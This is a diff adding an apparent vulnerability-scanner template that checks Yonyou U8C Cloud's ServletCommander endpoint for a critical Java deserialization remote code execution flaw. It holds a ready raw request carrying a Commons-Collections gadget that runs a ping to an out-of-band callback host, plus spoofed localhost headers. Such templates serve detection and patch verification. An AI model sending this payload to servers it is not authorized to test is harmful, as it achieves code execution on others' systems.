@@ -1,0 +1,30 @@
+id: yonyou-u8-cloud-servletcommander-rce
+
+info:
+  name: 用友 U8C Cloud ServletCommander 反序列化
+  author: SleepingBag945
+  severity: critical
+
+
+http:
+  - raw:
+    - |
+      POST /service/~tbb/nc.bs.ntb.plugin.ServletCommander HTTP/1.1
+      Host: {{Hostname}}
+      X-Forwarded-For: 127.0.0.10
+      X-Originating-IP: 127.0.0.10
+      X-Remote-Addr: 127.0.0.10
+      X-Remote-IP: 127.0.0.10
+
+      {{generate_java_gadget("commons-collections3.1", "ping {{interactsh-url}}", "raw")}}
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "dns"
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
